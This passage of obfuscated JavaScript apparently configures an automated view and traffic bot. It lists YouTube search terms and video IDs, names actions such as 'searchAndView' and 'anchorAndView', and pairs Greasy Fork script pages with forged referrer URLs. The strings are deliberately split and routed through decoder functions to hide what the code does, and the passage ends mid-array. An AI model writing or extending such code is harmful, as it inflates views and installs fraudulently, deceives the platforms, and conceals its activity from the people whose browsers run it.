searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + U(0x6) + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + U(0xf) + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x2076 + -0x19a3 + -0x6c9)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x12d * -0x9 + 0x1032 + -0x5 * 0x559)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1fcd * 0x1 + -0x4 * 0x97 + 0x1 * 0x222c);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    U(0x10) + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + V(0xe) + V(0x13) + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + U(0x0) + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + T(0xd, 'KiBC')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + T(0x8, 'NwD8') + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + V(0x2) + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + U(0x15) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + U(0x12) + 'ser-adbloc' + T(0x1, 'b#3['),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
